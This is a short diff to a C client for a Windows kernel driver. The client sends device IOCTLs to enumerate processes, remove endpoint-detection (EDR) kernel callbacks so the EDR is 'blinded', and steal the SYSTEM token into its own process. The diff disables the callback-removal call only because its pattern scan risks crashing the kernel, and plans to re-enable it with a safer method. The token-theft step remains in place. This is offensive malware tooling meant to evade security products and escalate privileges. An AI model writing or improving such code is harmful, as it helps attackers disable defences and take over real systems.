@@ -67,22 +67,13 @@ int main() {
         printf("%s IOCTL_JOCKY_ENUM_PROCS failed. Error: %lu\n", e, GetLastError());
     }
 
-    // --- IOCTL 3: Remove EDR Callbacks ---
-    printf("%s Removing EDR kernel callbacks...\n", i);
-
-    result = DeviceIoControl(
-        hDevice,
-        IOCTL_JOCKY_REMOVE_CALLBACKS,
-        NULL, 0,
-        NULL, 0,
-        &bytesReturned,
-        NULL
-    );
-
-    if (result)
-        printf("%s IOCTL_JOCKY_REMOVE_CALLBACKS: EDR blinded\n", k);
-    else
-        printf("%s REMOVE_CALLBACKS failed: %lu\n", e, GetLastError());
+    // --- IOCTL 3: Remove EDR Callbacks --- DISABLED
+    // Pattern scan is unsafe: 3-byte sequence hits false positives across 16MB
+    // of kernel text, zeroing the wrong slot = instant bugcheck.
+    // Re-enable once callback removal is rewritten with a safer method.
+    //
+    // result = DeviceIoControl(hDevice, IOCTL_JOCKY_REMOVE_CALLBACKS,
+    //     NULL, 0, NULL, 0, &bytesReturned, NULL);
 
     // --- IOCTL 4: Steal SYSTEM token into current process ---
     printf("%s Stealing SYSTEM token...\n", i);
